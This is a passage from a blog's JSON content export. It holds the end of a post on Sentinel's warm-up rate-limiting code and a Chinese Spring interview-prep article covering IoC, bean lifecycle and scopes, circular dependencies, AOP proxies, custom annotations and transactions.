&#123;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></li>\n<li>Warm Up（WarmUpController 和 WarmUpRateLimiterController）：预热启动<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">canPass</span><span class=\"params\">(Node node, <span class=\"type\">int</span> acquireCount, <span class=\"type\">boolean</span> prioritized)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">passQps</span> <span class=\"operator\">=</span> (<span class=\"type\">long</span>) node.passQps();</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">previousQps</span> <span class=\"operator\">=</span> (<span class=\"type\">long</span>) node.previousPassQps();</span><br><span class=\"line\">    syncToken(previousQps);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">// 开始计算它的斜率</span></span><br><span class=\"line\">    <span class=\"comment\">// 如果进入了警戒线，开始调整他的qps</span></span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">restToken</span> <span class=\"operator\">=</span> storedTokens.get();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (restToken &gt;= warningToken) &#123;</span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">aboveToken</span> <span class=\"operator\">=</span> restToken - warningToken;</span><br><span class=\"line\">        <span class=\"comment\">// 消耗的速度要比warning快，但是要比慢</span></span><br><span class=\"line\">        <span class=\"comment\">// current interval = restToken*slope+1/count</span></span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">warningQps</span> <span class=\"operator\">=</span> Math.nextUp(<span class=\"number\">1.0</span> / (aboveToken * slope + <span class=\"number\">1.0</span> / count));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (passQps + acquireCount &lt;= warningQps) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (passQps + acquireCount &lt;= count) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ul>\n"},{"title":"Spring最热点面试题","date":"2024-05-26T14:42:28.000Z","_content":"\n# spring\n\n## 架构图\n\n![结构图](./2024/05/26/Spring最热点面试题/1.png)\n\n## 模块\n\n### Core Container\n\n核心容器(Core Container)\n\n- `spring-beans` 该模块是依赖注入IoC与DI的最基本实现\n- `spring-core` 该模块是Bean工厂与bean的装配\n- `spring-context` 该模块构架于核心模块之上，它扩展了 BeanFactory，为它添加了 Bean 生命周期控制、框架事件体系以及资源加载透明化等功能。ApplicationContext 是该模块的核心接口，它的超类是\n  BeanFactory。与BeanFactory 不同，ApplicationContext 容器实例化后会自动对所有的单实例 Bean 进行实例化与依赖关系的装配，使之处于待用状态\n- `spring-context-indexer` 该模块是 Spring 的类管理组件和 Classpath 扫描\n- `spring-context-support` 该模块是对 Spring IOC 容器的扩展支持，以及 IOC 子容器\n- `spring-expression` 该模块是Spring表达式语言块是统一表达式语言（EL）的扩展模块，可以查询、管理运行中的对象，同时也方便的可以调用对象方法、操作数组、集合等\n\n### Data Access/Integration\n\n数据访问/集成\n\n- `spring-jdbc` 该模块提供了 JDBC抽象层，它消除了冗长的 JDBC 编码和对数据库供应商特定错误代码的解析\n- `spring-tx` 该模块支持编程式事务和声明式事务，可用于实现了特定接口的类和所有的 POJO 对象。编程式事务需要自己写beginTransaction()、commit()、rollback()\n  等事务管理方法，声明式事务是通过注解或配置由 spring 自动处理，编程式事务粒度更细\n- `spring-orm` 该模块提供了对流行的对象关系映射 API的集成，包括 JPA、JDO 和 Hibernate 等。通过此模块可以让这些 ORM 框架和 spring 的其它功能整合，比如前面提及的事务管理\n- `spring-oxm` 该模块提供了对 OXM 实现的支持，比如JAXB、Castor、XML Beans、JiBX、XStream等\n- `spring-jms` 该模块包含生产（produce）和消费（consume）消息的功能。从Spring 4.1开始，集成了 spring-messaging 模块\n\n### Web\n\n网络部分\n\n- `spring-web` 该模块为 Spring 提供了最基础 Web 支持，主要建立于核心容器之上，通过 Servlet 或者 Listeners 来初始化 IOC 容器，也包含一些与 Web 相关的支持\n- `spring-webmvc` 该模块众所周知是一个的 Web-Servlet 模块，实现了 Spring MVC（model-view-Controller）的 Web 应用\n- `spring-websocket` 该模块主要是与 Web 前端的全双工通讯的协议\n- `spring-webflux` 该模块是一个新的非堵塞函数式 Reactive Web 框架，可以用来建立异步的，非阻塞，事件驱动的服务，并且扩展性非常好。\n\n### 面向切面编程(AOP和Aspects)\n\n- `spring-aop` 该模块是Spring的另一个核心模块，是 AOP 主要的实现模块\n- `spring-aspects` 该模块提供了对 AspectJ 的集成，主要是为 Spring AOP提供多种 AOP 实现方法，如前置方法后置方法等\n\n### 设备(Instrumentation)\n\n- `spring-instrument` 该模块是基于JAVA SE 中的\"java.lang.instrument\"进行设计的，应该算是 AOP的一个支援模块，主要作用是在 JVM\n  启用时，生成一个代理类，程序员通过代理类在运行时修改类的字节，从而改变一个类的功能，实现 AOP 的功能\n\n### 消息(Messaging)\n\n- `spring-messaging` 是从 Spring4 开始新加入的一个模块，主要职责是为 Spring 框架集成一些基础的报文传送应用\n\n### 测试(Test)\n\n- `spring-test` 主要为测试提供支持的，通过 JUnit 和 TestNG 组件支持单元测试和集成测试。它提供了一致性地加载和缓存 Spring 上下文，也提供了用于单独测试代码的模拟对象（mock object）\n\n## IOC\n\n### IOC是什么？\n\n控制反转即IoC (Inversion of Control)，它把传统上由程序代码直接操控的对象的调用权交给容器，通过容器来实现对象组件的装配和管理。所谓的“控制反转”概念就是对组件对象控制权的转移，从程序代码本身转移到了外部容器。\n\nSpring IOC 负责创建对象，管理对象（通过依赖注入（DI），装配对象，配置对象，并且管理这些对象的整个生命周期。\n\n### 使用IOC的好处\n\n- 不用自己组装，拿来就用。\n- 享受单例的好处，效率高，不浪费空间\n- 便于单元测试，方便切换mock组件\n- 便于进行AOP操作，对于使用者是透明的\n- 统一配置，便于修改\n\n## BeanFactory 和 ApplicationContext有什么区别\n\nBeanFactory和ApplicationContext是Spring的两大核心接口，都可以当做Spring的容器。其中ApplicationContext是BeanFactory的子接口。\n\n### 依赖关系\n\nBeanFactory：是Spring里面最底层的接口，包含了各种Bean的定义，读取bean配置文档，管理bean的加载、实例化，控制bean的生命周期，维护bean之间的依赖关系。\n\nApplicationContext接口作为BeanFactory的派生，除了提供BeanFactory所具有的功能外，还提供了更完整的框架功能：\n\n- 继承MessageSource，因此支持国际化。\n- 统一的资源文件访问方式。\n- 提供在监听器中注册bean的事件。\n- 同时加载多个配置文件。\n- 载入多个（有继承关系）上下文 ，使得每一个上下文都专注于一个特定的层次，比如应用的web层。\n\n### 加载方式\n\nBeanFactroy采用的是延迟加载形式来注入Bean的，即只有在使用到某个Bean时(调用getBean())\n，才对该Bean进行加载实例化。这样，我们就不能发现一些存在的Spring的配置问题。如果Bean的某一个属性没有注入，BeanFacotry加载后，直至第一次使用调用getBean方法才会抛出异常。\n\nApplicationContext，它是在容器启动时，一次性创建了所有的Bean。这样，在容器启动时，我们就可以发现Spring中存在的配置错误，这样有利于检查所依赖属性是否注入。\nApplicationContext启动后预载入所有的单实例Bean，通过预载入单实例bean ,确保当你需要的时候，你就不用等待，因为它们已经创建好了。\n\n相对于基本的BeanFactory，ApplicationContext 唯一的不足是占用内存空间。当应用程序配置Bean较多时，程序启动较慢。\n\n### 创建方式\n\nBeanFactory通常以编程的方式被创建，ApplicationContext还能以声明的方式创建，如使用ContextLoader。\n\n### 注册方式\n\nBeanFactory和ApplicationContext都支持BeanPostProcessor、BeanFactoryPostProcessor的使用，但两者之间的区别是：BeanFactory需要手动注册，而ApplicationContext则是自动注册。\n\n### Spring IoC的初始化过程\n\n#### IOC粗略总结\n\n1. 首先入口是xml或者注解或者其他形式，要实现beanDefinationReader接口，然后 读取的时候，会将他们解析为bean的定义信息；\n2. beanFactory在加载bean信息实例化（底层用的反射）之前，spring加了一个接口beanFactoryPostProcessor,用作扩展用。\n3. beanFactory内部实例化bean之后，在要初始化bean对象之前，增加了一个一系列aware接口，将他的容器，以及工厂都暴露出来供使用者做扩展用。\n4. 经过一些列容器以及容器对象的注入之后，在初始化之前，spring又增加了一个接口 beanPostProcessor,该接口是可以作用于所有创建的bean,在初始化前后，均能通过重写该接口获取bean对象进行定制操作。\n5. 经过实现初始化接口完成初始化功能。\n6. 经过实现销毁接口disposableBean结束其生命。\n\n#### 重要的组件\n\n- `BeanDefinition` 描述bean的属性的接口，例如bean的scope是单例还是多例，构造方法，有哪些property value，依赖等，相当于对这个bean的一份身份描述\n    - Bean配置 --> BeanDefinition --> Bean对象\n      -\n      懒加载情况下，refresh只是把BeanDefinition注册到BeanFactory中，而不是把Bean注册到BeanFactory中。在调用上下文的getBean的时候才会去根据BeanDefinition生成具体的bean对象\n- `BeanDefinitionMap`\n- `BeanFactory`\n    - spring的基础bean容器\n    - 相当于存放所有bean的容器\n- `ApplicationContext`\n    - BeanFactory 的子接口，在 BeanFactory 的基础上构建，是相对比较高级的 IoC 容器实现。包含 BeanFactory\n      的所有功能，还提供了其他高级的特性，比如：事件发布、国际化信息支持、统一资源加载策略等。正常情况下，我们都是使用的 ApplicationContext\n    - 相当于丰富了beanfactory的功能，这里理解为上下文就好\n- `FactoryBean`\n\n#### 源码解析\n\n首先抛开其他组件的启动，我们只需要引入spring-context就可以启动一个容器了\n\n```xml\n<dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-context</artifactId>\n</dependency>\n```\n\n而在springboot出来之前最常见的加载bean的方式是读取配置文件\n\n```java\npublic static void main(String[]args){\n        ApplicationContext context=new ClassPathXmlApplicationContext(\"classpath:applicationfile.xml\");\n}\n```\n\n这里ApplicationContext是一个接口，主要的实现类有：\n\n- ClassPathXmlApplicationContext 需要一个 xml 配置文件在系统中的路径\n- FileSystemXmlApplicationContext 需要一个 xml 配置文件在系统中的路径\n- AnnotationConfigApplicationContext 基于注解，大势所趋\n\n下面的分析都基于 ClassPathXmlApplicationContext 进行分析，因为比较好理解点\n\n在 resources 目录新建一个配置文件，文件名随意，通常叫 application.xml 或 application-xxx.xml就可以了,对应的类实现一个：\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<beans xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns=\"http://www.springframework.org/schema/beans\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"\n       default-autowire=\"byName\">\n\n    <bean id=\"messageService\" class=\"com.javadoop.example.MessageServiceImpl\"/>\n</beans>\n```\n\nmain\n\n```java\npublic class App {\n    public static void main(String[] args) {\n        // 用我们的配置文件来启动一个 ApplicationContext\n        ApplicationContext context = new ClassPathXmlApplicationContext(\"classpath:application.xml\");\n\n        System.out.println(\"context 启动成功\");\n\n        // 从 context 中取出我们的 Bean，而不是用 new MessageServiceImpl() 这种方式\n        MessageService messageService = context.getBean(MessageService.class);\n        // 这句将输出: hello world\n        System.out.println(messageService.getMessage());\n    }\n}\n```\n\n在构造方法中的refresh()方法是启动加载整个容器的关键方法\n\n方法在springboot容器启动时也会加载,方法为\n\n- org.springframework.boot.SpringApplication#run\n- org.springframework.boot.SpringApplication#refreshContext\n\n```java\n@Override\npublic void refresh()throws BeansException,IllegalStateException{\n    // 1. 首先是一个synchronized加锁，当然要加锁，不然你先调一次refresh()然后这次还没处理完又调一次，就会乱套了；\n    synchronized (this.startupShutdownMonitor){\n        // 2. 这个方法是做准备工作的，记录容器的启动时间、标记“已启动”状态、处理配置文件中的占位符，可以点进去看看，这里就不多说了。\n        prepareRefresh();\n\n        // 3. 这个就很重要了，这一步是把配置文件解析成一个个Bean，并且注册到BeanFactory中，注意这里只是注册进去，并没有初始化。先继续往下看，等会展开这个方法详细解读\n        ConfigurableListableBeanFactory beanFactory=obtainFreshBeanFactory();\n\n        //4. 这个方法的作用是：设置 BeanFactory 的类加载器，添加几个 BeanPostProcessor，手动注册几个特殊的 bean，这里都是spring里面的特殊处理，然后继续往下看\n        prepareBeanFactory(beanFactory);\n\n        try{\n            // 5. 方法是提供给子类的扩展点，到这里的时候，所有的 Bean 都加载、注册完成了，但是都还没有初始化，具体的子类可以在这步的时候添加一些特殊的 BeanFactoryPostProcessor 的实现类，来完成一些其他的操作。\n            postProcessBeanFactory(beanFactory);\n    \n            // 6. 接下来是这个方法是调用 BeanFactoryPostProcessor 各个实现类的 postProcessBeanFactory(factory) 方法；\n            invokeBeanFactoryPostProcessors(beanFactory);\n    \n            // 7. 然后这个方法注册 BeanPostProcessor 的实现类，和上面的BeanFactoryPostProcessor 是有区别的，这个方法调用的其实是PostProcessorRegistrationDelegate类的registerBeanPostProcessors方法；\n            // 这个类里面有个内部类BeanPostProcessorChecker，BeanPostProcessorChecker里面有两个方法postProcessBeforeInitialization和postProcessAfterInitialization，这两个方法分别在 Bean 初始化之前和初始化之后得到执行。\n            // 然后回到refresh()方法中继续往下看\n            registerBeanPostProcessors(beanFactory);\n    \n            // 8. 方法是初始化当前 ApplicationContext 的 MessageSource，国际化处理，继续往下\n            initMessageSource();\n    \n            // 9. 方法初始化当前 ApplicationContext 的事件广播器继续往下\n            initApplicationEventMulticaster();\n    \n            // 10. 方法初始化一些特殊的 Bean（在初始化 singleton beans 之前）；继续往下\n            onRefresh();\n    \n            // 11. 方法注册事件监听器，监听器需要实现 ApplicationListener 接口；继续往下\n            registerListeners();\n    \n            // 12. 重点到了 初始化所有的 singleton beans（单例bean），懒加载（non-lazy-init）的除外，这个方法也是等会细说\n            finishBeanFactoryInitialization(beanFactory);\n    \n            // 13. 方法是最后一步，广播事件，ApplicationContext 初始化完成\n            finishRefresh();\n        } catch(BeansException ex){\n            if(logger.isWarnEnabled()){\n                logger.warn(\"Exception encountered during context initialization - \"+\"cancelling refresh attempt: \"+ex);\n            }\n\n            // Destroy already created singletons to avoid dangling resources.\n            // 销毁已经初始化的 singleton 的 Beans，以免有些 bean 会一直占用资源\n            destroyBeans();\n    \n            // Reset 'active' flag.\n            cancelRefresh(ex);\n    \n            // Propagate exception to caller.\n            throw ex;\n        } finally{\n            // Reset common introspection caches in Spring's core, since we\n            // might not ever need metadata for singleton beans anymore...\n            resetCommonCaches();\n        }\n    }\n}\n```\n\n### Spring bean的生命周期\n\nSpring Bean的生命周期分为四个阶段和多个扩展点。扩展点又可以分为影响多个Bean和影响单个Bean。整理如下：\n\n四个阶段\n\n- 实例化 Instantiation\n- 属性赋值 Populate\n- 初始化 Initialization\n- 销毁 Destruction\n\n多个扩展点\n\n- 影响多个Bean\n    - BeanPostProcessor(作用于初始化阶段的前后)\n    - InstantiationAwareBeanPostProcessor(作用于实例化阶段的前后)\n- 影响单个Bean\n    - Aware(Aware类型的接口的作用就是让我们能够拿到Spring容器中的一些资源)\n        - Aware Group1\n            - BeanNameAware\n            - BeanClassLoaderAware\n            - BeanFactoryAware\n        - Aware Group2\n            - EnvironmentAware\n            - EmbeddedValueResolverAware(实现该接口能够获取Spring EL解析器，用户的自定义注解需要支持spel表达式的时候可以使用)\n            - ApplicationContextAware(ResourceLoaderAware\\ApplicationEventPublisherAware\\MessageSourceAware)\n    - 生命周期(实例化和属性赋值都是Spring帮助我们做的，能够自己实现的有初始化和销毁两个生命周期阶段)\n        - InitializingBean\n        - DisposableBean\n\n### bean的作用域\n\nSpring Bean 中所说的作用域，在配置文件中即是“scope”\n\n在面向对象程序设计中作用域一般指对象或变量之间的可见范围。\n\n而在Spring容器中是指其创建的Bean对象相对于其他Bean对象的请求可见范围。\n\n在Spring 容器当中，一共提供了5种作用域类型，在配置文件中，通过属性scope来设置bean的作用域范围\n\n#### singleton\n\n```xml\n<bean id=\"userInfo\" class=\"cn.lovepi.UserInfo\" scope=\"singleton\"></bean>\n```\n\n当Bean的作用域为singleton的时候,Spring容器中只会存在一个共享的Bean实例，所有对Bean的请求只要id与bean的定义相匹配，则只会返回bean的同一实例。单一实例会被存储在单例缓存中，为Spring的缺省作用域。\n\n#### prototype\n\n```xml\n<bean id=\"userInfo\" class=\"cn.lovepi.UserInfo\" scope=\" prototype \"></bean>\n```\n\n每次对该Bean请求的时候，Spring IoC都会创建一个新的作用域。\n\n对于有状态的Bean应该使用prototype，对于无状态的Bean则使用singleton\n\n#### request\n\n```xml\n<bean id=\"userInfo\" class=\"cn.lovepi.UserInfo\" scope=\" request \"></bean>\n```\n\nRequest作用域针对的是每次的Http请求，Spring容器会根据相关的Bean的\n\n定义来创建一个全新的Bean实例。而且该Bean只在当前request内是有效的。\n\n#### session\n\n```xml\n<bean id=\"userInfo\" class=\"cn.lovepi.UserInfo\" scope=\" session \"></bean>\n```\n\n针对http session起作用，Spring容器会根据该Bean的定义来创建一个全新的Bean的实例。而且该Bean只在当前http session内是有效的。\n\n#### global session\n\n```xml\n<bean id=\"userInfo\" class=\"cn.lovepi.UserInfo\" scope=\"globalSession\"></bean>\n```\n\n类似标准的http session作用域，不过仅仅在基于portlet的web应用当中才有意义。Portlet规范定义了全局的Session的概念。他被所有构成某个portlet外部应用中的各种不同的portlet所共享。在global\nsession作用域中所定义的bean被限定于全局的portlet session的生命周期范围之内。\n\n### 循环依赖问题\n\n#### 三级缓存\n\nSpring 解决循环依赖的核心就是提前暴露对象，而提前暴露的对象就是放置于第二级缓存中。下表是三级缓存的说明：\n\n| 名称                  | 描述                                                         |\n| --------------------- | ------------------------------------------------------------ |\n| singletonObjects      | 一级缓存，存放完整的 Bean。                                  |\n| earlySingletonObjects | 二级缓存，存放提前暴露的Bean，Bean 是不完整的，未完成属性注入和执行 init 方法。 |\n| singletonFactories    | 三级缓存，存放的是 Bean 工厂，主要是生产 Bean，存放到二级缓存中。 |\n\n所有被Spring 管理的 Bean，最终都会存放在 singletonObjects 中，这里面存放的 Bean 是经历了所有生命周期的（除了销毁的生命周期），完整的，可以给用户使用的。\n\nearlySingletonObjects 存放的是已经被实例化，但是还没有注入属性和执行 init 方法的 Bean。\n\nsingletonFactories 存放的是生产 Bean 的工厂。\n\nBean 都已经实例化了，为什么还需要一个生产 Bean 的工厂呢？这里实际上是跟 AOP 有关，如果项目中不需要为 Bean 进行代理，那么这个 Bean 工厂就会直接返回一开始实例化的对象，如果需要使用 AOP 进行代理，那么这个工厂就会发挥重要的作用了，这也是本文需要重点关注的问题之一。\n\n#### 解决循环依赖\n\nSpring 是如何通过上面介绍的三级缓存来解决循环依赖的呢？这里只用 A，B 形成的循环依赖来举例：\n\n1. 实例化 A，此时 A 还未完成属性填充和初始化方法（@PostConstruct）的执行，A 只是一个半成品。\n2. 为 A 创建一个 Bean 工厂，并放入到  singletonFactories 中。\n3. 发现 A 需要注入 B 对象，但是一级、二级、三级缓存均为发现对象 B。\n4. 实例化 B，此时 B 还未完成属性填充和初始化方法（@PostConstruct）的执行，B 只是一个半成品。\n5. 为 B 创建一个 Bean 工厂，并放入到  singletonFactories 中。\n6. 发现 B 需要注入 A 对象，此时在一级、二级未发现对象 A，但是在三级缓存中发现了对象 A，从三级缓存中得到对象 A，并将对象 A 放入二级缓存中，同时删除三级缓存中的对象 A。（注意，此时的 A 还是一个半成品，并没有完成属性填充和执行初始化方法）\n7. 将对象 A 注入到对象 B 中。\n8. 对象 B 完成属性填充，执行初始化方法，并放入到一级缓存中，同时删除二级缓存中的对象 B。（此时对象 B 已经是一个成品）\n9. 对象 A 得到对象 B，将对象 B 注入到对象 A 中。（对象 A 得到的是一个完整的对象 B）\n10. 对象 A 完成属性填充，执行初始化方法，并放入到一级缓存中，同时删除二级缓存中的对象 A。\n\n\n## Spring框架中的单例bean是否线程安全\n\nSpring框架中的单例bean是线程安全的吗？它是如何处理线程并发问题的?\n\n不是，Spring框架中的单例bean不是线程安全的。\n\nspring 中的 bean 默认是单例模式，spring 框架并没有对单例 bean 进行多线程的封装处理。实际上大部分 spring bean 是无状态的（比如 dao 类），在某种程度上来说 bean 也是安全的，但如果 bean\n有状态的话（比如 view model ）就要开发者自己去保证线程安全了，最简单的就是改变 bean 的作用域，把“singleton”变更为“prototype”，这样请求 bean 相当于 new Bean()了， 保证线程安全了。\n\n- 有状态就是有数据存储功能。\n- 无状态就是不会保存数据。\n\nSpring如何处理线程并发问题?\n\n一般只有无状态的Bean才可以在多线程下共享，大部分是无状态的Bean。当存有状态的Bean的时候，spring一般是使用ThreadLocal进行处理，解决线程安全问题。\n\nThreadLocal和线程同步机制都是为了解决多线程中相同变量的访问冲突问题。 同步机制采用了“时间换空间”的方式，仅提供一份变量，不同的线程获取锁，没获得锁的线程则需要排队。而ThreadLocal采用了“空间换时间”的方式。\nThreadLocal会为每一个线程提供一个独立的变量副本，从而隔离了多个线程对数据的访问冲突。因为每一个线程都拥有自己的变量副本，所以没有相同变量的访问冲突问题。所以在编写多线程代码时，可以把不安全的变量封装进ThreadLocal。\n\n## AOP\n\nOOP(Object-Oriented Programming)面向对象编程，允许开发者定义纵向的关系，但并适用于定义横向的关系，导致了大量代码的重复，而不利于各个模块的重用。\n\nAOP(Aspect-Oriented Programming)\n，一般称为面向切面编程，作为面向对象的一种补充，用于将那些与业务无关，但却对多个对象产生影响的公共行为和逻辑，抽取并封装为一个可重用的模块，这个模块被命名为“切面”（Aspect），减少系统中的重复代码，降低了模块间的耦合度，同时提高了系统的可维护性。可用于权限认证、日志、事务处理等。\n\n### AOP原理\n\n原理是在IOC过程中，创建bean实例时，最后都会对bean进行处理来实现增强，对于AOP来说就是创建代理类\n\n- 底层是动态代理技术\n    - JDK动态代理(基于接口)\n    - CGLib动态代理(基于类)\n    - 在Spring AOP中，如果使用的是单例，推荐使用CGLib代理\n\n### JDK动态代理\n\n(一）实现原理\n\nJDK的动态代理是基于反射实现。JDK通过反射，生成一个代理类，这个代理类实现了原来那个类的全部接口，并对接口中定义的所有方法进行了代理。当我们通过代理对象执行原来那个类的方法时，代理类底层会通过反射机制，回调我们实现的InvocationHandler接口的invoke方法。并且这个代理类是Proxy类的子类（记住这个结论，后面测试要用）。这就是JDK动态代理大致的实现方式。\n\n（二）优点\n\nJDK动态代理是JDK原生的，不需要任何依赖即可使用；\n\n通过反射机制生成代理类的速度要比CGLib操作字节码生成代理类的速度更快；\n\n（三）缺点\n\n如果要使用JDK动态代理，被代理的类必须实现了接口，否则无法代理；\n\nJDK动态代理无法为没有在接口中定义的方法实现代理，假设我们有一个实现了接口的类，我们为它的一个不属于接口中的方法配置了切面，Spring仍然会使用JDK的动态代理，但是由于配置了切面的方法不属于接口，为这个方法配置的切面将不会被织入。\n\nJDK动态代理执行代理方法时，需要通过反射机制进行回调，此时方法执行的效率比较低；\n\n### CGLib动态代理\n\n（一）实现原理\n\nCGLib实现动态代理的原理是，底层采用了ASM字节码生成框架，直接对需要代理的类的字节码进行操作，生成这个类的一个子类，并重写了类的所有可以重写的方法，在重写的过程中，将我们定义的额外的逻辑（简单理解为Spring中的切面）织入到方法中，对方法进行了增强。而通过字节码操作生成的代理类，和我们自己编写并编译后的类没有太大区别。\n\n（二）优点\n\n使用CGLib代理的类，不需要实现接口，因为CGLib生成的代理类是直接继承自需要被代理的类；\n\nCGLib生成的代理类是原来那个类的子类，这就意味着这个代理类可以为原来那个类中，所有能够被子类重写的方法进行代理；\n\nCGLib生成的代理类，和我们自己编写并编译的类没有太大区别，对方法的调用和直接调用普通类的方式一致，所以CGLib执行代理方法的效率要高于JDK的动态代理；\n\n（三）缺点\n\n由于CGLib的代理类使用的是继承，这也就意味着如果需要被代理的类是一个final类，则无法使用CGLib代理；\n\n由于CGLib实现代理方法的方式是重写父类的方法，所以无法对final方法，或者private方法进行代理，因为子类无法重写这些方法；\n\nCGLib生成代理类的方式是通过操作字节码，这种方式生成代理类的速度要比JDK通过反射生成代理类的速度更慢；\n\n### AOP术语\n\n#### 连接点(Join point)\n\n能够被拦截的地方\n\n#### 切点(Poincut)\n\n具体定位的连接点\n\n#### 增强/通知(Advice)\n\n表示添加到切点的一段逻辑代码，并定位连接点的方位信息\n\n#### 织入(Weaving)\n\n将增强/通知添加到目标类的具体连接点上的过程。\n\n#### 引入/引介(Introduction)\n\n允许我们向现有的类添加新方法或属性。是一种特殊的增强！\n\n#### 切面(Aspect)\n\n切面由切点和增强/通知组成，它既包括了横切逻辑的定义、也包括了连接点的定义\n\n### Spring对AOP的支持\n\n- 基于代理的经典SpringAOP：需要实现接口，手动创建代理\n- 纯POJO切面：使用XML配置，aop命名空间\n- @AspectJ注解驱动的切面：使用注解的方式，这是最简洁和最方便的！\n\n## 怎么定义一个注解\n\n### 引入依赖\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-aop</artifactId>\n</dependency>\n```\n\n### 定义注解\n\n#### 元注解\n\njava.lang.annotation 提供了四种元注解，专门注解其他的注解（在自定义注解的时候，需要使用到元注解）：\n\n- @Documented – 注解是否将包含在JavaDoc中\n- @Retention – 什么时候使用该注解\n- @Target – 注解用于什么地方\n- @Inherited – 是否允许子类继承该注解\n\n##### @Retention\n\n定义该注解的生命周期\n\n- RetentionPolicy.SOURCE : 在编译阶段丢弃。这些注解在编译结束之后就不再有任何意义，所以它们不会写入字节码。@Override, @SuppressWarnings都属于这类注解。\n- RetentionPolicy.CLASS : 在类加载的时候丢弃。在字节码文件的处理中有用。注解默认使用这种方式\n- RetentionPolicy.RUNTIME : 始终不会丢弃，运行期也保留该注解，因此可以使用反射机制读取该注解的信息。我们自定义的注解通常使用这种方式。\n\n##### @Target\n\n表示该注解用于什么地方。默认值为任何元素，表示该注解用于什么地方。可用的ElementType 参数包括\n\n- ElementType.CONSTRUCTOR: 用于描述构造器\n- ElementType.FIELD: 成员变量、对象、属性（包括enum实例）\n- ElementType.LOCAL_VARIABLE: 用于描述局部变量\n- ElementType.METHOD: 用于描述方法\n- ElementType.PACKAGE: 用于描述包\n- ElementType.PARAMETER: 用于描述参数\n- ElementType.TYPE: 用于描述类、接口(包括注解类型) 或enum声明\n\n##### @Documented\n\n一个简单的Annotations 标记注解，表示是否将注解信息添加在java文档中。\n\n##### @Inherited\n\n定义该注释和子类的关系\n\n@Inherited 元注解是一个标记注解，@Inherited 阐述了某个被标注的类型是被继承的。如果一个使用了@Inherited 修饰的annotation 类型被用于一个class，则这个annotation 将被用于该class\n的子类。\n\n### 示例\n\n自定义一个检查是否登录的注解\n\n```java\n@Target({ElementType.TYPE, ElementType.METHOD})\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\npublic @interface CheckLogin {\n\n}\n```\n\n实现\n\n```java\n@Aspect\n@Component\n@Slf4j\n@Order(1)\npublic class CheckLoginAspect {\n\n    @Autowired\n    RedisTemplate redisTemplate;\n\n    @Before(\"execution(* *..controller..*(..))\")\n    public void before(JoinPoint joinPoint) {\n        MethodSignature signature = (MethodSignature) joinPoint.getSignature();\n        Method method = signature.getMethod();\n        CheckLogin annotation = method.getAnnotation(CheckLogin.class);\n\n        if (annotation == null) {\n            //获取类上注解\n            annotation = joinPoint.getTarget().getClass().getAnnotation(CheckLogin.class);\n        }\n        if (annotation != null) {\n            //获取到请求的属性\n            ServletRequestAttributes attributes =\n                    (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();\n            //获取到请求对象\n            HttpServletRequest request = attributes.getRequest();\n            String ssoToken = HttpUtil.getSsoToken(request);\n            if (ssoToken != null) {\n                String loginUserTokenKey = AuthRedisKeyUtil.getLoginUserTokenKey(ssoToken);\n                if (redisTemplate.hasKey(loginUserTokenKey)) {\n                    //通过\n                } else {\n                    throw new LoginException(\"登录已过期\");\n                }\n            } else {\n                throw new IllegalRequestException(\"非法请求\");\n            }\n        }\n    }\n}\n```\n\n使用\n\n```java\n@RestController\npublic class AccountController {\n\n    @CheckLogin\n    @GetMapping(\"/query\")\n    public JSONObject queryRegulation(Integer pageNum, Integer pageSize) {\n        //....业务逻辑\n    }\n}\n```\n\n## 事务\n\n### Spring 支持两种方式的事务管理\n\n#### 1、编程式事务管理\n\n- TransactionTemplate\n\n```java\n@Autowired\nprivate TransactionTemplate transactionTemplate;\n\npublic void testTransaction(){\n    transactionTemplate.execute(new TransactionCallbackWithoutResult(){\n        @Override\n        protected void doInTransactionWithoutResult(TransactionStatus status){\n                try{\n                    //...业务代码\n                }catch(Exception e){\n                    status.setRollbackOnly();\n                }\n        }\n    });\n}\n```\n\n- TransactionManager\n\n```java\n    @Autowired\nprivate PlatformTransactionManager transactionManager;\n\npublic void testTransaction2(){\n        TransactionStatus status=transactionManager.getTransaction(new DefaultTransactionDefinition());\n        try{\n            //...业务代码\n            transactionManager.commit(status);\n        }catch(Exception e){\n            transactionManager.rollback(status);\n        }\n}\n```\n\n#### 2、注解\n\n- @Transactional\n\n### 事务的传播性 Propagation\n\n① PROPAGATION_REQUIRED：如果当前没有事务，就创建一个新事务，如果当前存在事务，就加入该事务，该设置是最常用的设置。\n\n② PROPAGATION_SUPPORTS：支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以非事务执行。\n\n③ 